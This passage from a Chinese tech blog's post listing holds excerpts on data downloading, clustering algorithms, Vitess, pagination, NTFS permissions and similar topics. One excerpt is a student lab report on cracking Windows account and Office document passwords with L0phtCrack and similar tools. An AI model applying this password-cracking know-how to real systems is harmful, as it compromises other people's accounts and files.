		<a class="list__footer-readmore btn" href="/posts/aaf382fd2ad6022d0e7be4760cf15853/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/518cd530036aec51994f0fbbc4923b29/" rel="bookmark">
			oceancolor数据批量下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		oceancolor数据批量下载 浏览器附件法wget方法 引言：苦于下载数据之苦，折腾了一天，做个笔记（钻研不够，只写出了我解决的部分）
oceancolor官网
oceancolor提供了三种方法批量下载，分别是：
1.wget，
2.cURL,
3.浏览器附件（DownThemAll）
接下来详述我所采用的一些批量下载的方法
浏览器附件法 采用的附件是Firefox&gt; DownThemAll
oceancolor上是这样描述的：
If you prefer a GUI based option, there is an add-on for the Firefox web browser called ‘DownThemAll’. It is easy to configure to download only what you want from the page (even has a default for archived products -gz, tar, bz2, etc.). It allows putting a limit concurrent downloads, which is important for downloading from our servers as we limit connections to one concurrent per file and 3 files per IP - so don’t try the “accelerate” features as you’re IP may get blocked.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/518cd530036aec51994f0fbbc4923b29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6727c3877fc84e02a282c3921a02ca2/" rel="bookmark">
			git commit 忽略绕过Eslint校验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 git commit 忽略Eslint校验一句代码 git commit --no-verify -m "提交" //可以跳过代码检查 vue中js单文件绕过ESlint检测 一般不推荐绕过检测
/eslint-disabled/ ESList忽略单行代码检测(仅忽略下方一行)
/* eslint-disable-next-line */ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b0870cd233aebff3f344d3d66ac96b7/" rel="bookmark">
			【CASE】芝加哥犯罪率数据集（CatBoostClassifier）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：top 2% based on CatBoostClassifier
导入库与数据 import numpy as np import pandas as pd pd.set_option("display.max_columns", None) from sklearn.preprocessing import LabelEncoder, OrdinalEncoder, OneHotEncoder from sklearn.compose import ColumnTransformer from sklearn.base import clone from sklearn.model_selection import StratifiedKFold, train_test_split from sklearn.metrics import log_loss from sklearn.decomposition import PCA from sklearn.mixture import GaussianMixture import catboost import gensim data_train = pd.read_csv("C:\\Users\\Nihil\\Documents\\pythonlearn\\data\\kaggle\\sf-crime\\train.csv") data_test = pd.read_csv("C:\\Users\\Nihil\\Documents\\pythonlearn\\data\\kaggle\\sf-crime\\test.csv") 特征处理 def transformTimeDataset(dataset): dataset['Dates'] = pd.to_datetime(dataset['Dates']) dataset['Date'] = dataset['Dates'].dt.date dataset['n_days'] = (dataset['Date']-dataset['Date'].min()).apply(lambda x:x.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b0870cd233aebff3f344d3d66ac96b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35d2a52b31da7f1d06d6909cd1e058f5/" rel="bookmark">
			WPF、Silverlight项目中使用柱状图、饼状图、折线图，去水印版及去掉“You are using the trial version”的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自：请参考:http://www.cnblogs.com/sunyjie/p/3410851.html
在开发的过程中，可能会遇到柱状图、饼状图、折线图来更好的显示数据，最近整理了一下，遂放出来望需要的朋友可以参考。本文仅仅是简单显示，如需复杂显示效果请参考官网代码示例。----本文代码使用WPF，Silverlight类似代码，使用第三方wpf_visifire_v5.1.2-0_trial控件。
后续会放上Html5示例。
代码下载地址：代码下载
先放上一组截图吧：
公共数据： 1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
private List&lt;string&gt; strListx = new List&lt;string&gt;() { "苹果", "樱桃", "菠萝", "香蕉", "榴莲", "葡萄", "桃子", "猕猴桃" };
private List&lt;string&gt; strListy = new List&lt;string&gt;() { "13", "75", "60", "38", "97", "22", "39", "80" };
private List&lt;DateTime&gt; LsTime = new List&lt;DateTime&gt;()
{
new DateTime(2012,1,1),
new DateTime(2012,2,1),
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35d2a52b31da7f1d06d6909cd1e058f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5eca4fd5931389080e9f1cafda2e2ab/" rel="bookmark">
			jieba.analyse的使用：提取关键字
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		① jieba.analyse.extract_tags 提取关键字：
第一个参数：待提取关键词的文本
第二个参数：返回关键词的数量，重要性从高到低排序
第三个参数：是否同时返回每个关键词的权重
第四个参数：词性过滤，为空表示不过滤，若提供则仅返回符合词性要求的关键词
print("***案例1***"*3) txt='那些你很冒险的梦，我陪你去疯，折纸飞机碰到雨天终究会坠落，伤人的话我直说，因为你会懂，冒险不冒险你不清楚，折纸飞机也不会回来，做梦的人睡不醒！' Key=jieba.analyse.extract_tags(txt,topK=3) print(Key) #----------------------------------------------------------------------------------- print("***案例2***"*3) # 字符串前面加u表示使用unicode编码 import jieba.analyse content = u'《小丑》全球票房已经超过十亿美元，成为全球首部达到这个成绩的R级电影。而其自身出色的投资回报率也让其成为史上盈利数最高的“超英漫改”作品。而在几个月前，它更加夺目的一项荣耀则是首部获得威尼斯电影节最高荣誉奖的“主流”“超英漫改”作品。' # 第一个参数：待提取关键词的文本 # 第二个参数：返回关键词的数量，重要性从高到低排序 # 第三个参数：是否同时返回每个关键词的权重 # 第四个参数：词性过滤，为空表示不过滤，若提供则仅返回符合词性要求的关键词 keywords = jieba.analyse.extract_tags(content, topK=5, withWeight=True, allowPOS=()) print(keywords) 输出结果：
key:
keywords:
② jieba.analyse.textrank 提取关键字：
# 同样是四个参数，但allowPOS默认为('ns', 'n', 'vn', 'v') # 即仅提取地名、名词、动名词、动词 keywords = jieba.analyse.textrank(content, topK=5, withWeight=True, allowPOS=('ns', 'n', 'vn', 'v')) # 访问提取结果 keywords keywords:仅仅输出地名、名词、动名词、动词
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f370fe19e6d7ddca1efabeb688bc96b3/" rel="bookmark">
			开源中间件Vitess助力MySQL实现分库分表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于Vitess
Vitess自2011年以来一直为YouTube的所有数据库流量提供服务，目前已被许多企业采用，以满足其生产需求。
Vitess是一个用于部署、扩展和管理大型mysql实例集群的数据库解决方案。它的架构是在公共或私有云架构中高效运行，就像在专用硬件上一样。它结合并扩展了许多重要的mysql特性和nosql数据库的可伸缩性。
Vitess可以解决以下问题
1. 实现MYSQL的分片，应用只需很少的更改或无需更改
2. 部署和管理大型数据库集群实例
3. 裸设备到云的迁移
Vitess相对MySQL改进
MySQL
Vitess
每个MySQL连接的内存开销都在256KB到3MB之间，具体取决于您使用的是哪个MySQL版本。随着用户群的增长，您需要添加RAM来支持更多连接，但RAM无助于加快查询速度。另外，与获取连接相关的CPU成本也很高。
Vitess基于gRPC的协议创建了非常轻量级的连接。Vitess的连接池功能使用Go的并发支持将这些轻量级连接映射到一小群MySQL连接。因此，Vitess可以轻松处理数千个连接。
编写不好的查询（如未设置LIMIT的查询）可能会对所有用户的数据库性能产生负面影响。
Vitess采用SQL解析器，使用一组可配置的规则来重写可能会损害数据库性能的查询。
分区是对数据进行分区以提高可伸缩性和性能的过程。MySQL缺乏本地分片支持，要求您编写分片代码并在应用程序中嵌入分片逻辑。
Vitess支持各种分片方案。它还可以将表迁移到不同的数据库中，并扩大或缩小碎片的数量。这些功能是非侵入式执行的，只需几秒钟的只读停机时间即可完成大部分数据转换。
使用可用性复制的MySQL集群具有主数据库和一些副本。如果主人失败，副本应该成为新的主人。这要求您管理数据库生命周期并将当前系统状态传达给您的应用程序。
Vitess有助于管理数据库场景的生命周期。它支持并自动处理各种场景，包括主站故障切换和数据备份。
MySQL群集可以为不同的工作负载定制数据库配置，例如用于写入的主数据库，用于Web客户端的快速只读副本，批处理作业的较慢只读副本等等。如果数据库具有水平分片，则每个分片都会重复该设置，并且该应用需要插入逻辑以了解如何找到正确的数据库。
Vitess使用由一致数据存储支持的拓扑，如etcd或ZooKeeper。这意味着群集视图始终是最新的，并且对于不同的客户端是一致的。Vitess还提供了一个代理，可以有效地将查询路由到最合适的MySQL实例。
Vitess整体架构
Topology Topology服务是一个包含服务器信息，分片方案和主从信息的元数据信息存储服务。Topology服务是基于一致性存储方案来实现数据一致性，例如：zookeeper和etcd。用户可以通过使用vtctl（命令行）和vtctld（web）访问Topology。
vtgate vtgate是一个轻量代理服务器，它将查询路由到正确的vttablet并将合并的结果返回给客户端。vtgate接收到请求时会对sql进行解析，根据Topology服务中的元数据判断路由到哪个vttablet； vtgate是直接接受应用程序发起的查询的服务。因为客户端只需要能够找到一个vtgate实例即可正常访问，所以客户端的实现可以非常简单。
vttablet vttablet是一个位于MySQL数据库实例前面的代理服务器，并且要求与对应的MYSQL实例部署在同一个Pod上。在JED中对于每个MySQL实例对应的都有一个Tablet实现。
vtctl vtctl是用于管理弹性数据库集群的命令行工具。它允许人或应用程序轻松地与弹性数据库实现交互。通过Vtctl可以标识主从数据库， 创建表， 启动故障转移， 执行分片（重新分片）等操作。
vtctld vtctld是一个HTTP服务器，允许您浏览存储在锁服务器中的信息。
vtworker vtworker负责处理长时间运行的进程。如： 1. 在分片分割和连接过程中重新划分不同的作业检查数据完整性 2. 垂直分割不同作业检查垂直分割和连接期间的数据完整性
vtctlclient 通过客户端进行基本功能的校验。 使用方法：vtctlclient -server 127.0.0.1:15999 command param
Vitess的使用方式
Vitess借助Kubernetes能更好的实现逻辑库及节点管理。
Kubernetes 是 Google 开源的 Docker 容器集群管理系统，Vitess 是 Kubernetes 用户的逻辑存储引擎的一个可选项。 Kubernetes 对一个计算集群中的节点进行调度，对这些节点之上的负载进行管理，并对包含有同一应用的容器进行分组以易于管理和发现。使用 Kubernetes，你可以很容易去创建和管理一个 Vitess 集群，可谓开箱即用。
基本概念：
keyspace
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f370fe19e6d7ddca1efabeb688bc96b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4eb628d904f409d5a16c24ad8d6610c/" rel="bookmark">
			分页实现的原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当查询结果过多时，服务器需要更多的时间进行处理并返回数据；如果不使用分页技术，服务器会将查找到的数据一次性全返回给用户端，浏览器（用户端）加载全部数据的过程是很浪费资源与时间的；而分页技术则能很好的解决这个问题；分页可将服务器返回的数据分段展示给用户，不必一次返回全部数据，仅将用户查询的当页数据或上一页或下一页数据展示给用户；既提高了服务器响应的效率，减少了响应时间；又提升了用户体验，一举两得；
这篇博客简述一下分页的实现过程；我们要创建的浏览器用户端的界面是这样的；
其功能为：
第一次访问会显示前三条数据；
用户可通过上一页按钮浏览本页面之前的3条数据，当本页面处于第一页时，点击上一页按钮会提示相关信息；
用户可通过下一页按钮浏览本页面之后的3条数据，当本页面处于最后一页时，点击下一页按钮会提示相关信息；
用户可通过模糊查询（表格上面输入查询条件，点击搜索按钮）查询想要了解的数据；
首先在MySQL数据库中创建这么一个表：（后文查询用）
每三条数据分为一页，并在分页的基础上建立模糊查询功能；
在三级联动里已有很详细的准备工作（准备必要的jar包），这里不再详述，直接看代码；
index.jsp
&lt;%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%&gt; &lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt; &lt;title&gt;Insert title here&lt;/title&gt; &lt;script type="text/javascript" src="./js/jquery-1.8.3.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form&gt; &lt;input name="name" placeholder="按名字搜索"/&gt; &lt;input name="address" placeholder="按住址搜索"/&gt; &lt;input type="button" value="搜索" onclick="search()"/&gt; &lt;/form&gt; &lt;div id="data"&gt;&lt;/div&gt; &lt;input type="button" value="上一页" onclick="up()"/&gt;&lt;input type="button" value="下一页" onclick="down()"/&gt; &lt;script&gt; var pageNo=1; //默认从第一页开始 var pageTotal=0; //默认总页数为0 function up(){ if(pageNo==1){ alert("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4eb628d904f409d5a16c24ad8d6610c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46d74ba0d4ddd6fc23e3c1f5dc383492/" rel="bookmark">
			springboot 动态多数据源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		springboot 动态多数据源 应用：同一个应用中使用多个数据库，根据需要切换数据库
********************* 相关类与接口
AbstractRoutingDataSource
public abstract class AbstractRoutingDataSource extends AbstractDataSource implements InitializingBean { ************ 部分字段 @Nullable private Map&lt;Object, Object&gt; targetDataSources; //目标数据源 @Nullable private Object defaultTargetDataSource; //默认数据源 ************ 常用方法 public void setTargetDataSources(Map&lt;Object, Object&gt; targetDataSources) { this.targetDataSources = targetDataSources; } //设置目标数据源 public void setDefaultTargetDataSource(Object defaultTargetDataSource) { this.defaultTargetDataSource = defaultTargetDataSource; } //设置默认数据源 @Nullable protected abstract Object determineCurrentLookupKey(); //抽象方法，设置数据源的key ********************* 示例：同一应用中向不同的数据库中插入数据
数据库h1：表user
数据库h2：表person
******************
config 层
DynamicDatasource：动态数据源切换
public class DynamicDataSource extends AbstractRoutingDataSource { private ThreadLocal&lt;DataSource_Enum&gt; threadLocal=new ThreadLocal&lt;&gt;(); public void switchDataSource(DataSource_Enum dataSource_enum){ threadLocal.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46d74ba0d4ddd6fc23e3c1f5dc383492/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdc5728b2c2ac582911c487c028d4aa9/" rel="bookmark">
			Deployment 加载nfs磁盘持久化配置过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一: NFS服务器
nfs服务器: 10.10.10.69 path：/data
对于需要容器内数据持久化的，低成本的方案是自己部署nfs server。
对于性能有要求的可以使用企业级 NAS 或者 ceph glusterfs。
[root@node01 ~]#
[root@node01 ~]#
[root@node01 ~]# ps -ef|grep nfs
root 1650 2 0 Sep09 ? 00:00:00 [nfsd]
root 1651 2 0 Sep09 ? 00:00:00 [nfsd]
root 1652 2 0 Sep09 ? 00:00:00 [nfsd]
root 1654 2 0 Sep09 ? 00:00:00 [nfsd]
root 1656 2 0 Sep09 ? 00:00:00 [nfsd]
root 1657 2 0 Sep09 ? 00:00:00 [nfsd]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fdc5728b2c2ac582911c487c028d4aa9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbf1014ed07df40c0c3b09d3ee34360f/" rel="bookmark">
			网络安全 实验五 ：破解密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		班级 软件工程17-1 学号 3172052*512** 姓名 晏鸡鹏 同组实验者 他老爸 实验名称 实验五 ：破解密码 日期 2019年12月9日 一、实验目的：
1．了解口令破解基本方法；
2．体会设置安全口令的重要意义。
二、实验环境：
Pentium Ⅲ、 600 MHz 以上 CPU， 128M 以上内存， 10G 以上硬盘，安装 Windows2000 以上操作系统，破解密码软件 L0phtCrack、Aoxppr.exe、APDFPRP、 MailHack.exe 等，关闭杀毒和防火墙软件。
三、实验内容：
(写出主要的上机内容及实验结果或截图)
破解 Windows2000/XP 系统密码 安装 L0phtCrack（简称 LC5）软件，运行 LC5，根据 LC5 向导（LC5 Wizard） 选择密码猜测模式，根据软件提示，一步一步进行，即可以获得本地或远程计算机 Windows2000/XP 系统所有用户密码。 说明：LC5 可以用来检测 Win NT/2000/XP/UNIX 用户是否使用了不安全的密码， 可以作为系统管理员评估用户口令安全性的工具。也是最好、最快的操作系统管理员帐 号密码破解工具。LC5 功能很多，实验时每个功能可以试做一次。 可查看密码为：123
破解 Office 文档密码 任意编写一个 Office 文档，并对该文档进行加密。如 my.doc，通过 word 菜单上 的“工具”→“选项”→“保存”→在“打开权限密码”中，为 my.doc 设置密码，如 123456。 执行 Aoxppr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbf1014ed07df40c0c3b09d3ee34360f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fbb8badbf46abf03c20f1df310f7beba/" rel="bookmark">
			Windows server 2012 R2 搭建文件服务器（四）：NTFS权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 NTFS权限和Share权限NTFS权限Share权限对比 准备条件实际操作1. 进入文件分享的属性2. 自定义权限3. 编辑NTFS权限4. NTFS权限5. 高级NTFS权限 几种权限组合的对比几个Bug下一步 在之前的这篇&lt;&lt;Windows server 2012 R2 搭建文件服务器（二）：实现分享功能&gt;&gt;中我们成功将5个文件夹分享给了5个不同的部门，也就是域控中的5个不同的组。但是一共遗留下来了两个问题，其中关于超过指定容量告警的功能已经在上一节&lt;&lt;Windows server 2012 R2 搭建文件服务器（三）：配额设置&gt;&gt;中解决，还有一个是对远程访问用户的权限进行限制和分类，这一节我们一起来看一看。
我是T型人小付，一位坚持终身学习的互联网从业者。喜欢我的博客欢迎在csdn上关注我，如果有问题欢迎在底下的评论区交流，谢谢。
NTFS权限和Share权限 在进行具体的操作之前有必要先来点Windows文件权限方面的理论知识。
Windows的文件权限有两类限制：NTFS权限和Share权限。这两类限制的目的都是一样的，阻止非法的文件或者文件夹访问，但是在使用上却有所区别。
NTFS权限 NTFS(New Technology File System)是Windows的一种文件系统，NTFS权限顾名思义就是针对不同用户在这个文件系统里对文件或者文件夹访问的一个规则的集合。这里的用户可以是本地的或者是远程用户。同时比起Share权限，NTFS权限拥有颗粒更细的高级选项。
在文件或者文件夹上点右键，查看属性，在Security页签里面就可以看到针对这个对象的NTFS权限了，如下图
Share权限 Share权限顾名思义管理的是通过网络去访问特定资源时候的规则，对于本地用户无效。同时规则比较简单，并不能做细颗粒的设置。不过不受文件系统的限制，不管是NTFS或者FAT和FAT32文件系统。
在文件或者文件夹上右键，查看属性。点击Sharing页签下的Advanced Sharing
然后点击Permissions
就可以查看该对象的Share权限了
对比 Share权限比较简单，NTFS权限比较细致。所以通常来说是将Share权限全开，然后用NTFS来进行管理如果Share权限和NTFS权限同时存在，那么更严格的那个会覆盖比较宽松的。例如Share权限允许所有人只读权限，同时NTFS权限允许所有人修改权限，因为Share权限更严格，所以用户在网盘上只有读的权限如果文件系统是FAT或者FAT32，那么NTFS权限是不可以使用的NFTS权限对本地登陆的用户也有效，但是Share权限对本地用户无效Share权限可以用来限制同时访问一个共享文件夹的数目（在上面Share权限的第二张图里面设置Limit the number of simultaneous users to），但是NTFS权限没有这个功能 在下面的操作中，我会将Share权限设置为所有人有全部权限，然后利用NTFS权限去进行管理
准备条件 已经加入域的Windows server 2012 R2一台，且按照上一节方式成功完成了分享功能 这里加域是为了统一管理文件分享权限，你可能会需要在域里面有这台服务器的本地管理员权限才能进行后续操作。关于域的使用我后面会专门做一个系列进行详细介绍。
实际操作 我因为在海外工作，操作系统为英文，所以截图大部分会出现英文，但是界面布局和中文系统是一样的。
1. 进入文件分享的属性 点击服务器主页的File and Storage Service，然后点击Shares，在需要修改权限的分享上点击右键，选择Properties
2. 自定义权限 选择Permissions，可以看到我这个文件夹对于用户tester以及管理员都具有Full Control的权限，这是非常危险的，因为tester用户可以做很多危险操作，例如删除文件夹。点击下面的Customize permissions进行自定义设置
3. 编辑NTFS权限 这里的Permissions就是对NTFS权限的设置，Share就是对Share权限的设置。Share权限里面保持对Everyone的Full Control即可，只是在NTFS权限里面进行修改。例如如果要对tester用户的权限进行修改，选择tester用户，然后点击下面的edit
4. NTFS权限 这里展示的只是NTFS的6个基本权限，前面说过NTFS可以进行高颗粒度的配置，点击右边的Show advanced permissions进入高级选项
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fbb8badbf46abf03c20f1df310f7beba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43486004971de7ffc8d01a63bd8b6baa/" rel="bookmark">
			k-prototypes聚类算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 数据变量为单一的数值型和单一的类别型的聚类算法之前都已经介绍过了，但是实际的数据大多数是数值型和类别型变量混合。针对混合型变量的数据，采用k-prototypes算法进行聚类。
k-prototypes算法 k-prototypes算法在聚类的过程中，是将数据的数值型变量和类别型变量拆开，分开计算样本间变量的距离，再将两者相加，视为样本间的距离。
k-prototypes聚类的准则就是使用一个合适的损失函数去度量数值型和分类变量对原型的距离；
k-prototypes算法步骤：
1.随机选取k个初始原型(中心点)；
2.针对数据集中的每个样本点，计算样本点与k个原型的距离（数值型变量计算欧氏距离，类别型变量计算汉明距离），将样本点划分到离它最近的中心点所对应的类别中；
3.类别划分完成后，重新确定类别的原型，数值型变量样本取值的均值作为新的原型的特征取值，类别型变量样本取值的众数作为新的原型的特征取值；
4.重复步骤2 3，直到没有样本改变类别，返回最后的聚类结果。
算法总结：
1）基于“众心”和“质心”的聚类方法；
2）数值型变量和类别型变量混合数据聚类方法。
python实现 #加载所需模块 import numpy as np import pandas as pd from kmodes.kprototypes import KPrototypes %matplotlib inline import matplotlib.pyplot as plt import seaborn as sns from sklearn import preprocessing #数据预处理 data_num = data[['aa','bb']] data_cat = data[['cc','dd']] le = preprocessing.LabelEncoder() data_cat = data_cat.apply(le.fit_transform) #类别型变量如果不是数值，需要先做LabelEncode data[columns_to_normalize] = data[columns_to_normalize].apply(lambda x: (x - x.mean()) / np.std(x)) #数值型变量做标准化处理，类别型变量如果不是数值，需要先做LabelEncode data = data.values #转化为数组 #模型训练不同的类别数对应的SSE及模型 def TrainCluster(df, model_name=None, start_k=2, end_k=20): print('training cluster') #df = StandardScaler().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43486004971de7ffc8d01a63bd8b6baa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e86675a5828046eb632dda89409d639/" rel="bookmark">
			k-modes聚类算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 之前介绍的K-means和k-medoids算法都是针对数据为数值型的聚类算法，计算样本间的距离采用的是欧式距离，所以如果数据变量是类别型的采用这两种算法，就需要先进行one-hot编码或者dummy coding。针对类别型变量的聚类，可以采用k-modes聚类算法。
k-modes算法 当数据变量为数值型时，可以采用k-modes算法进行聚类。因为该算法中计算的是样本间的汉明距离，如果变量取值不是数值，最好先进行LabelEncode，计算速度会更快。
k-modes算法步骤：
1.随机选取k个初始中心点；
2.针对数据集中的每个样本点，计算样本点与k个中心点的距离（这边计算的是汉明距离，为两个样本点不同的属性取值的个数），将样本点划分到离它最近的中心点所对应的类别中；
3.类别划分完成后，重新确定类别的中心点，将类别中所有样本各特征的众数作为新的中心点对应特征的取值，即该类中所有样本的众心；
4.重复步骤2 3，直到总距离（各个簇中样本与各自簇中心距离之和）不再降低，返回最后的聚类结果。
算法总结：
1）基于“众心”的聚类方法；
2）数据变量为类别型的聚类方法；
3）时间复杂度低于K-means和K-medoids聚类；
python实现 #加载所需模块 from kmodes import kmodes import multiprocessing import matplotlib.pyplot as plt from sklearn.metrics import silhouette_score #模型训练不同的类别数对应的SSE及模型 def TrainCluster(df, start_k=2, end_k=20): print('training cluster') K = [] SSE = [] silhouette_all = [] models = [] #保存每次的模型 for i in range(start_k, end_k): kmodes_model = kmodes.KModes(n_clusters=i, n_jobs=multiprocessing.cpu_count()) kmodes_model.fit(df) a = metrics.silhouette_score(df, kmodes_model.labels_, metric='hamming') SSE.append(kmodes_model.cost_) # 保存每一个k值的SSE值 K.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e86675a5828046eb632dda89409d639/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bf769a6603e8ee628b98b061c546522/" rel="bookmark">
			k-medoids聚类算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 上一篇博客介绍了k-means聚类算法，该算法虽然高效快速，但却受异常点的影响严重，如果样本中存在异常点，则聚类结果会产生极大的偏差。针对异常点对聚类结果的影响，本文介绍k-medoids聚类算法，k-medoids算法能有效削弱异常点的影响。
k-medoids算法 k-mediods每次选取的中心点，必须是样本点，而 k-means每次选取的中心点可以是样本点之外的点，就好比中位数和平均值的区别；
k-medoids算法步骤：
1.任意选取k个初始中心点medoids；
2.按照与medoids最近的原则，将剩余点分配到当前最佳的medoids代表的类中;
3.在每一类中，计算每个样本点与其他点的距离之和，选取距离之和最小的点作为新的medoids;
4.重复2-3的过程，直到所有的medoids点不再发生变化，或已达到设定的最大迭代次数;
k-medoids算法选取簇中心点的准则函数是:当前簇中所有其他点到该中心点的距离之和最小，所以需要遍历簇中所有点；
算法总结
1）基于“代表对象”的聚类方法；
2）数据变量为数值型的聚类算法；
3）异常点不会严重影响聚类结果；
4）时间复杂度高于k-means算法。
python实现 #加载所需模块 import numpy as np from numpy import * import sys from sklearn import metrics from sklearn.preprocessing import StandardScaler import pandas as pd import matplotlib.pyplot as plt # 定义欧式距离的计算 def func_of_dis(x, y): return np.sqrt(sum(np.square(x - y))) #k-medoids算法实现 def KMedoids(df, k_num_center): """ 选定好距离公式开始进行训练 :param df:样本数据，pd.DataFrame类型 :param k_num_center:类别数 """ print('初始化',k_num_center, '个中心点') data = df.values #data = StandardScaler().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6bf769a6603e8ee628b98b061c546522/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a0f15ded02975dc98d458befcf5c29aa/" rel="bookmark">
			ECharts y轴坐标均分，且最小值不出现小数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 yAxis: { max:value =&gt; { if (value.max &lt; 10) { return 10; } let max = value.max; let val = max / 5; const round = true; const exponent = Math.floor(Math.log(val) / Math.LN10); const exp10 = Math.pow(10, exponent); const f = val / exp10; // 1 &lt;= f &lt; 10 let nf; if (round) { if (f &lt; 1.5) { nf = 1; } else if (f &lt; 2.5) { nf = 2; } else if (f &lt; 4) { nf = 3; } else if (f &lt; 7) { nf = 5; } else { nf = 10; } } else { if (f &lt; 1) { nf = 1; } else if (f &lt; 2) { nf = 2; } else if (f &lt; 3) { nf = 3; } else if (f &lt; 5) { nf = 5; } else { nf = 10; } } val = nf * exp10; return val*5; }, } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb5ecbb7f87f6b3c504b375fbc59234f/" rel="bookmark">
			C&#43;&#43;之最小生成树算法（Prim）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在讲述Prim算法之前让我们先了解一下什么是最小生成树？以下是我摘自维基百科： 最小生成树是一副连通加权无向图中一棵权值最小的生成树。 在一给定的无向图 G = (V, E) 中，(u, v) 代表连接顶点 u 与顶点 v 的边（即 {(u,v)\in E}(u,v)\in E），而 w(u, v) 代表此边的权重，若存在 T 为 E 的子集 且 (V, T) 为树，使得 {w(T)={(u,v)\in T}w(u,v)}w(T)=\sum _{(u,v)\in T}w(u,v) 的 w(T) 最小，则此 T 为 G 的最小生成树。 最小生成树其实是最小权重生成树的简称。 通俗点讲就是：我们用线段把图所有的顶点进行连接，连接时不能产生圈，并且所有边权值的和为最小。因此我们可知，最小生成树可能不是唯一的。 今天我们先来讲述最小生成树的其中的一种算法：Prim算法。 Prim算法的思想（摘自维基百科）： Prim算法的每一步都会为一棵生长中的树添加一条边，该树最开始只有一个顶点，然后会添加V-1个边。每次总是添加生长中的树和树中除该生长的树以外的部分形成的切分的具有最小权值的横切边。 什么意思呢？通俗点说就是我们选择一个root顶点，然后让其慢慢的生成一个树，也就是给其加边，每次加边时所选择的root顶点是来自于其前一个顶点，直到图中的所有顶点加到树上。Prim算法的核心思想其实是贪婪算法，与Dijkstra的算法思想一样，其实现几乎也是一模一样的哦~。在Dijkstra算法里面dis的作用是存储起始顶点到访问顶点的最小权值，对它进行更新，维护。但是Prim算法就不一样了哦~为什么呢？前面我们提到过，我们贪婪的选择最小的边生成一颗树。因此Prim算法里面dis的作用是存储未知顶点到已知顶点的权值。还有一个重要点：加入的边的数量比顶点数少一哦~~ Prim的核心代码： void Graph::Prim(size_t v) { verptr-&gt;disweight[v] = 0; size_t count = 0; while (count!=verptr-&gt;vertexnumber-1) { size_t min = Infinity; for (int i = 0; i &lt; verptr-&gt;vertexnumber; ++i) { if 